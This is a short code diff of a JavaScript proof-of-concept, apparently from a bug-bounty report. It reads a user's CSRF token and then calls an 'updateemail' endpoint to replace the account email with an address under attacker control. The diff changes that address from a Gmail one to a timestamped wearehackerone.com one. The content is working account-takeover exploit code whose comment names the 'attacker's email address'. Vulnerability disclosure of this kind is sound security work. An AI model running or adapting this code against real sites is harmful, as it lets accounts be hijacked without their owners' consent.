@@ -14,7 +14,7 @@ $(document).ready(function() {
         });
         return [userCsrfToken, currentEmail];
     }
-    
+   const cTimestamp = Math.floor(Date.now() / 1000); 
     function changeEmail(newEmail) {
         var userInfo = fetchInfo();
         var emailChangeUrl = "/users/" + utag_data.context.user.tuid + "/updateemail"
@@ -35,6 +35,6 @@ $(document).ready(function() {
     }
     
     // triggering change email with the attacker's email address
-    changeEmail("pentestai31@gmail.com");
+    changeEmail("stsai+" + cTimestamp + "@wearehackerone.com");
     
 });
